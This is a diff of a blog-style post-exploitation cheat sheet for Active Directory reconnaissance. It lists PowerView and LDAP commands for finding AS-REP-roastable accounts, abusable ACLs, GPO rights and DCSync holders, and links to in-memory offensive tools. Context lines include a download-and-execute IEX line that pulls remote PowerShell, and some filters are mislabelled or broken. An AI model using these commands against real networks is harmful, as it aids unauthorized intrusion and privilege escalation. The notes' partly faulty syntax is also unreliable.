@@ -2,7 +2,7 @@
 layout: post
 title: windows post-exp 2
 date: 2025-05-01
-description: windows AD recon for lateral moviment
+description: windows AD recon for lateral movement
 categories: windows
 ---
 
@@ -49,6 +49,11 @@ $netobj = New-Object System.Net.WebClient;
 IEX($netobj.DownloadString('https://sf-res.com/miniview.ps1'));
 ```
 
+- get domain controller
+```
+> Get-DomainController | select Forest, Name, OSVersion | fl
+```
+
 - info all users
 ```
 PS X:> Get-NetUser | select name, lastlogontimestamp, serviceprincipalname, admincount, memberof | Format-Table -Wrap -AutoSize 
@@ -62,8 +67,7 @@ PS X:> Get-UserProperties -Properties name,memberof,description,info
 ```
 PS X:> Get-NetGroup -FullData | select name, description | Format-Table -Wrap -AutoSize 
 
-PS X:\> Get-NetGroup | Get-NetGroupMember -FullData | ForEach-Object -Process
-{"$($_.GroupName), $($_.MemberName), $($_.description)"}
+PS X:\> Get-NetGroup | Get-NetGroupMember -FullData | ForEach-Object -Process {"$($_.GroupName), $($_.MemberName), $($_.description)"}
 
 PS X:> get-domaingroup -Properties distinguishedname,samaccountname,member
 
@@ -90,6 +94,64 @@ PS X:\> Get-NetComputer -FullData | select cn, operatingsystem, logoncount, last
 PS X:\> Get-NetUser | select name,serviceprincipalname | Format-Table -Wrap -AutoSize
 ```
 
+- Domain trust
+```
+> Get-DomainTrust
+```
+
+- Identify AS-REP vulnerable account
+```
+> Get-ADUser - Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
+
+> (Get-ACL "AD:$((Get-ADUser -Filter 'useraccountcontrol -band 4194304').distinguishedname)").access
+
+> (Get-ACL "AD:$((Get-ADcomputer brmssql).distinguishedname)").access
+```
+
+- Enum ACLs
+```
+> Get-DomainObjectAcl -SamAccountName <TARGET-USER> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
+
+> Get-DomainGroup "Domain Admins" -FullData
+
+> Get-DomainObjectAcl -ResolveGUIDs | ? {$_;objectdn -eq "CN=Domain Admins,CN=Users,DC=local,DC=domain"}
+
+> Get-DomainObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=local,DC=domain" -and $_.IdentityReference -eq "domain\<username>"}
+```
+
+- Enum GPOs
+```
+> Get-DomainGPO -ComputerIdentity <WORKSTATION> -Properties DisplayName | sort -Property DisplayName
+
+> Get-DomainLocalGroup | select GPODisplayName, GroupName
+
+> Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
+
+
+- show all SIDs that can create new GPOs (convert sids with ConvertFrom-SID)
+> Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=domain,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+
+
+- show principals that can write to the GP-Link attribute on OUs
+> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
+
+
+- list machines within an OU
+> Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName
+```
+
+```
+> Invoke-ACLScanner
+
+- Check for GPO Edit rights, Passwrod Change and User Addition privileges
+- Check for users who can roll out scheduled tasks or add new GPOs to OUs or Computers
+- Check for users with the following for DCSync permissions:
+  - DS-Replication-Get-Changes
+  - Replication Directory Changes All
+  - Replication Directory Changes In Filtered Set
+
+- https://github.com/FSecureLABS/SharpGPOAbuse 
+```
 
 
 ## LDAP queries + PS
@@ -162,16 +224,62 @@ $search.FindAll()
 
 - some filters
 ```powershell
+- Collects names and metadata of hosts in the domain.
 Base Object: dc=[REDACTED],dc=local
-"(objectCategory=CN=Computer,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)" Collects names and metadata of hosts in the domain.
+"(objectCategory=CN=Computer,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)"
 
+- Collects trust information in the domain.
 Base Object: dc=[REDACTED],dc=local,
-"(objectCategory=CN=Trusted-Domain,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)" Collects trust information in the domain.
+"(objectCategory=CN=Trusted-Domain,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)"
 
+- Collects Domain Administrators and Service Principals in the domain (need fix).
 Base Object: DC=[REDACTED],DC=local 
-"( & ( &(sAMAccountType=805306368) (servicePrincipalName=*) ( ! (sAMAccountName=krbtgt) ) ( ! (userAccountControl&2) ) ) (adminCount=1) )" Collects Domain Administrators and Service Principals in the domain.
-(need fix)
+"( & ( &(sAMAccountType=805306368) (servicePrincipalName=*) ( ! (sAMAccountName=krbtgt) ) ( ! (userAccountControl&2) ) ) (adminCount=1) )"
 
+- Find disabled users
+(&(objectcategory=user)(UserAccountControl:1.2.840.113556.1.4.803:=2))
+
+- Find users with password never expires attribute
+(&(objectcategory=user)(UserAccountControl:1.2.840.113556.1.4.803:=2))
+
+- Find all users created at a certain time period
+(&(objectcategory=user)(whencreated>=20190101000000.0Z))
+(&(&(&(objectclass=user)(whencreate>=20210101000000.0Z))))
+(&(&(objectclass=user)(whencreate>=20210101000000.0Z&<=20190101000000.0Z&)))
+
+- Find all users who mmust change password at next logon
+(&(objectcategory=user)(pwdlastset=0))
+
+- Find users with password expired
+(&(objectcategory=user)(UserAccountControl:1.2.840.113556.1.4.803:=8388608))
+
+- Find users with locked accounts
+(&(objectcategory=user)(UserAccountControl:1.2.840.113556.1.4.803:=16))
+
+- Find users who have never logged on
+(&(objectcategory=user)(lastlogon=0))
+
+- Find all XP based S.O or windows 7/2008 R2
+(&(objectcategory=computer)(operatingsystemversion=5.1*))
+(&(objectcategory=computer)(operatingsystemversion=6.1*))
+
+- Find sccounts with 'service' keyword in description
+(objectcategory=user)(description=*service*)
+
+- Find empty groups
+(objectcategory=group)(!member=*)
+
+- Find users with empty profile path
+(objectcategory=person)(!profilepath=*)
+
+- Find all users, except disabled ones
+(objectcategory=person)(objectclass=user)(!UserAccountControl:1.2.840.113556.1.4.803:=2)
+
+- Find users with email
+(objectcategory=person)(mail=*)
+
+- Find users without email
+(objectcategory=person)(!mail=*)
 ```
 
 - accounts with SPN
@@ -346,7 +454,15 @@ Assim como o cobaltstrike que é basicamente todos os modulos de pós-exploraç�
 ## Tools for automate recon 
 > ___
 
-- Seatbelt https://github.com/GhostPack/Seatbelt
+- Seatbelt https://github.com/GhostPack/Seatbelt (exec inmemory)
+
+- SharpUp (lpe checks) https://github.com/GhostPack/SharpUp (exec inmemory)
+
+- SharpWMI https://github.com/GhostPack/SharpWMI (exec inmemory)
+
+- SharpView (C# powerview) https://github.com/tevora-threat/SharpView (exec inmemory)
+
+- ADSearch https://github.com/tomcarver16/ADSearch
 
 - AdFind http://www.joeware.net/freetools/tools/adfind/
   - https://thedfirreport.com/2020/05/08/adfind-recon/
@@ -364,13 +480,14 @@ Assim como o cobaltstrike que é basicamente todos os modulos de pós-exploraç�
   - https://docs.redhat.com/en/documentation/red_hat_directory_server/11/html/administration_guide/examples-of-common-ldapsearches#Examples-of-common-ldapsearches
 
 
-
+- dsquery ex:
+```
 dsquery.exe * -filter "(objectCategory=Person)" -attr cn title displayName description department company sAMAccountName mail mobile telephoneNumber whenCreated whenChanged logonCount badPwdCount distinguishedName -L -limit 0
 dsquery.exe * -filter "(objectCategory=Computer)" -attr cn operatingSystem operatingSystemServicePack operatingSystemVersion dNSHostName whenCreated whenChanged lastLogonTimestamp distinguishedName description managedBy mS-DS-CreatorSID -limit 0
 dsquery.exe * -filter "(objectCategory=Computer)" -attr cn servicePrincipalName -L -limit 0
 dsquery.exe * -filter "(objectCategory=Group)" -uc -attr cn sAMAccountName distinguishedName description -limit 0
 dsquery.exe * -filter "(objectClass=organizationalUnit)" -attr ou name whenCreated distinguishedName gPLink -limit 0
-
+```
 
 
 #### Conforme eu for achando e testando tecnicas e tools novas vou atualizar aqui.
